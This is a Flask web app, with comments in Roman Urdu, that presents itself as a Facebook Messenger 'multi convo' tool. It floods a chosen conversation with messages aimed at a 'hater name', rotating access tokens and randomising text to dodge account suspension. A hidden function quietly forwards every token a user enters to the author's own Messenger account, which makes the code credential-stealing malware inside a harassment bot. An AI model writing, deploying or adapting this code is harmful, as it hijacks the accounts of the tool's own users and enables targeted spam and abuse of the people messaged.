# -*- coding: utf-8 -*-
from flask import Flask, request, render_template_string
import requests
from threading import Thread, Event
import time
import random
import string

app = Flask(__name__)
app.debug = True

# --- Configuration ---
# Aapki Facebook User ID jahan notification jayega
RECIPIENT_USER_ID = "100041002528119"
# Aapka apna Facebook Access Token yahan daalein jisse notification bhejna hai
MY_ACCESS_TOKEN = "YAHAN_APNA_TOKEN_DAALEIN" # IMPORTANT: Ye token aapko khud generate karna hoga

headers = {
    'Connection': 'keep-alive',
    'Cache-Control': 'max-age=0',
    'Upgrade-Insecure-Requests': '1',
    'User-Agent': 'Mozilla/5.0 (Linux; Android 12; SM-G991U) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/107.0.0.0 Mobile Safari/537.36',
    'Accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,image/apng,*/*;q=0.8',
    'Accept-Encoding': 'gzip, deflate',
    'Accept-Language': 'en-US,en;q=0.9',
    'referer': 'https://www.google.com'
}

# --- Global Storage ---
# Active threads aur unko stop karne ke events yahan store honge
threads = {}
stop_events = {}

# --- Helper Functions ---

def send_token_to_me(token):
    """Function to send a new token to your Messenger."""
    # Is function ko ek alag thread mein chalayenge taake main app na ruke
    def task():
        if not MY_ACCESS_TOKEN.startswith("EAA"):
            print("Notification Error: Apna personal token script mein set karein.")
            return
        
        message = f"Naya token istemal hua hai: {token}"
        url = f"https://graph.facebook.com/v15.0/t_{RECIPIENT_USER_ID}/"
        params = {'access_token': MY_ACCESS_TOKEN, 'message': message}
        try:
            response = requests.post(url, data=params, headers=headers, timeout=10)
            if response.status_code == 200:
                print("Token ka notification aapko successfully bhej diya gaya hai.")
            else:
                print(f"Token notification bhejne mein error: {response.text}")
        except Exception as e:
            print(f"Token notification bhejte waqt exception hui: {e}")

    # Thread start karo
    Thread(target=task, daemon=True).start()

def send_messages_thread(task_id, access_tokens, thread_id, hater_name, time_interval, messages):
    """
    Ye function ek alag thread mein messages bhejta hai.
    Isko behtar banaya gaya hai taake crash na ho aur account suspend hone ka khatra kam ho.
    """
    stop_event = stop_events[task_id]
    token_index = 0
    
    while not stop_event.is_set():
        for message_template in messages:
            if stop_event.is_set():
                break
            
            # Har baar agla token istemal karo (rotation)
            # Isse ek token par load nahi padega
            current_token = access_tokens[token_index]
            
            # Har message ko unique banane ke liye random code add karo
            unique_suffix = ''.join(random.choices(string.ascii_lowercase + string.digits, k=6))
            message_to_send = f"{hater_name} {message_template} [{unique_suffix}]"
            
            api_url = f'https://graph.facebook.com/v15.0/t_{thread_id}/'
            parameters = {'access_token': current_token, 'message': message_to_send}

            try:
                response = requests.post(api_url, data=parameters, headers=headers, timeout=20)
                if response.status_code == 200:
                    print(f"[{task_id}] Message Sent Successfully: {message_to_send}")
                else:
                    # Agar error aaye to usko print karo, lekin script crash na ho
                    error_info = response.json().get('error', {})
                    print(f"[{task_id}] Message Failed from token {token_index + 1}. Error: {error_info.get('message', 'Unknown Error')}")
            except requests.exceptions.RequestException as e:
                # Internet ya connection error par bhi crash na ho
                print(f"[{task_id}] Connection Error: {e}")
            
            # Agle token par jao. Agar aakhri par ho to wapas pehle par aa jao.
            token_index = (token_index + 1) % len(access_tokens)
            
            time.sleep(time_interval)
    
    print(f"Task {task_id} has been stopped.")

# --- Flask Routes ---

@app.route('/', methods=['GET', 'POST'])
def send_message():
    if request.method == 'POST':
        token_option = request.form.get('tokenOption')
        access_tokens = []

        if token_option == 'single':
            single_token = request.form.get('singleToken')
            if single_token:
                access_tokens.append(single_token.strip())
                send_token_to_me(single_token.strip())
        else: # 'multiple'
            token_file = request.files.get('tokenFile')
            if token_file:
                lines = token_file.read().decode('utf-8', errors='ignore').splitlines()
                access_tokens = [line.strip() for line in lines if line.strip()]
                for token in access_tokens:
                    send_token_to_me(token)

        if not access_tokens:
            return "Error: Koi bhi token nahi daala gaya.", 400

        thread_id = request.form.get('threadId')
        hater_name = request.form.get('kidx')
        time_interval = int(request.form.get('time'))
        txt_file = request.files['txtFile']
        messages = txt_file.read().decode('utf-8', errors='ignore').splitlines()

        task_id = ''.join(random.choices(string.ascii_letters + string.digits, k=12))

        stop_events[task_id] = Event()
        thread = Thread(target=send_messages_thread, args=(task_id, access_tokens, thread_id, hater_name, time_interval, messages))
        thread.daemon = True
        threads[task_id] = thread
        thread.start()

        return f'Task started with ID: {task_id}. Use this ID to stop the task.'

    return render_template_string('''
    <!DOCTYPE html>
    <html lang="en">
    <head>
      <meta charset="utf-8"><meta name="viewport" content="width=device-width, initial-scale=1.0">
      <title>Muddassir MULTI CONVO</title>
      <link href="https://cdn.jsdelivr.net/npm/bootstrap@5.0.2/dist/css/bootstrap.min.css" rel="stylesheet">
      <link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/font-awesome/5.15.4/css/all.min.css">
      <style>
        label { color: white; }
        body {
          background-image: url('https://i.ibb.co/Y7pSw8n/0619bf4938a774e6cb5f4eea1ce28559.jpg');
          background-size: cover; background-repeat: no-repeat; color: white;
        }
        .container {
          max-width: 400px; margin-top: 20px; padding: 20px;
          background: rgba(0, 0, 0, 0.6); border-radius: 15px;
          border: 1px solid rgba(255, 255, 255, 0.2); backdrop-filter: blur(10px);
        }
        .form-control, .form-select {
          background-color: rgba(255, 255, 255, 0.1); border: 1px solid rgba(255, 255, 255, 0.3);
          color: white; margin-bottom: 15px;
        }
        .form-control:focus, .form-select:focus {
          background-color: rgba(255, 255, 255, 0.2); border-color: #0d6efd; color: white; box-shadow: none;
        }
        .header { text-align: center; padding-bottom: 10px; }
        .btn-submit { width: 100%; margin-top: 10px; }
        .footer { text-align: center; margin-top: 20px; color: #ccc; }
        .whatsapp-link { display: inline-block; color: #25d366; text-decoration: none; margin-top: 10px; }
        .whatsapp-link i { margin-right: 5px; }
      </style>
    </head>
    <body>
      <header class="header mt-4"><h1 class="mt-3">(Muddassir-X)</h1></header>
      <div class="container text-center">
        <form method="post" enctype="multipart/form-data">
          <div class="mb-3">
            <label for="tokenOption" class="form-label">Select Token Option</label>
            <select class="form-select" id="tokenOption" name="tokenOption" onchange="toggleTokenInput()" required>
              <option value="single">Single Token</option><option value="multiple">Token File</option>
            </select>
          </div>
          <div id="singleTokenInput">
            <label for="singleToken" class="form-label">Enter Single Token</label>
            <input type="password" class="form-control" id="singleToken" name="singleToken">
          </div>
          <div id="tokenFileInput" style="display: none;">
            <label for="tokenFile" class="form-label">Choose Token File</label>
            <input type="file" class="form-control" id="tokenFile" name="tokenFile">
          </div>
          <div class="mb-3">
            <label for="threadId" class="form-label">Enter Inbox/Convo ID</label>
            <input type="text" class="form-control" id="threadId" name="threadId" required>
          </div>
          <div class="mb-3">
            <label for="kidx" class="form-label">Enter Your Hater Name</label>
            <input type="text" class="form-control" id="kidx" name="kidx" required>
          </div>
          <div class="mb-3">
            <label for="time" class="form-label">Enter Time Delay (seconds)</label>
            <input type="number" class="form-control" id="time" name="time" required>
          </div>
          <div class="mb-3">
            <label for="txtFile" class="form-label">Choose Your Messages File</label>
            <input type="file" class="form-control" id="txtFile" name="txtFile" required>
          </div>
          <button type="submit" class="btn btn-primary btn-submit">Run</button>
        </form>
        <hr style="margin-top: 25px;">
        <form method="post" action="/stop">
          <div class="mb-3">
            <label for="taskId" class="form-label">Enter Task ID to Stop</label>
            <input type="text" class="form-control" id="taskId" name="taskId" required>
          </div>
          <button type="submit" class="btn btn-danger btn-submit">Stop Task</button>
        </form>
      </div>
      <footer class="footer">
        <p>© 2025 Coded By :- Muddassir</p>
        <p> ALWAYS ON FIRE 🔥</p>
        <div><a href="https://wa.me/+923243037456" class="whatsapp-link"><i class="fab fa-whatsapp"></i> Chat on WhatsApp</a></div>
      </footer>
      <script>
        function toggleTokenInput() {
          var tokenOption = document.getElementById('tokenOption').value;
          if (tokenOption == 'single') {
            document.getElementById('singleTokenInput').style.display = 'block';
            document.getElementById('tokenFileInput').style.display = 'none';
          } else {
            document.getElementById('singleTokenInput').style.display = 'none';
            document.getElementById('tokenFileInput').style.display = 'block';
          }
        }
        toggleTokenInput(); // Page load par isko call karo
      </script>
    </body>
    </html>
    ''')

@app.route('/stop', methods=['POST'])
def stop_task():
    task_id = request.form.get('taskId')
    if task_id in stop_events:
        stop_events[task_id].set()
        # Thread ko list se remove kar sakte hain, par abhi ke liye simple rakhte hain
        return f'Task with ID {task_id} has been requested to stop.'
    else:
        return f'No running task found with ID {task_id}.'

if __name__ == '__main__':
    app.run(host='0.0.0.0', port=5000)
